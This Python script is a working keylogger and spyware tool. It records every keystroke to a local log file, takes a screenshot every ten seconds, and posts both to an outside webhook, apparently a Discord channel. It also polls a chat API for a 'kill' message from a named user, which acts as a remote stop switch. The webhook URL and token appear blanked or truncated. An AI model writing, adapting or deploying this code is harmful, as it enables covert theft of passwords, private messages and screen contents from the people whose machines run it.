from pynput import keyboard
from threading import Thread
import os
import time 
import pyautogui
import requests
import json

count=0
screen_short=0
images=[]
webhook_url="ht"
def command():
    headers={
        "authorization":"MTIy"
    }
    r=requests.get("",headers=headers)
    j=json.loads(r.text)
    for values in j:
        if values['content']=='kill' and values['author']['username']=='ishigiri.' :
            return True
def create():
    os.system("mkdir imPg")
    os.system("type nul > log.txt")
create()


def write(key):
    global count
    with open("log.txt","a") as f:
        k=str(key).replace("'","")
        if k.find("space")>0:
            f.write(" ")
        else:
            f.write(k)
            count+=1
        
        if count>=40:
            f.write("\n")
            count=0


def on_press(key,injection):
    write(str(key))

def on_release(key,injection):
     if key == keyboard.Key.esc:
        return False

     
def keyloger():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


def screenshort():
    while True:
        global screen_short
        fname=os.path.join("imPg","screen.png")
        pyautogui.screenshot().save(fname)
        with open(fname,"rb") as photo:
            requests.post(webhook_url,files={"file":photo})
        if command()==True:
            break
        time.sleep(10) 

def send():
    while True:
        with open("log.txt","r") as f:
            keyloger_data=f.read()
            requests.post(webhook_url,data={"content":keyloger_data})
            f.close()
        if command()==True:
            break
        time.sleep(10)


t1=Thread(target=screenshort)
t2=Thread(target=keyloger)
t3=Thread(target=send)
t1.start()
t2.start()
t3.start()
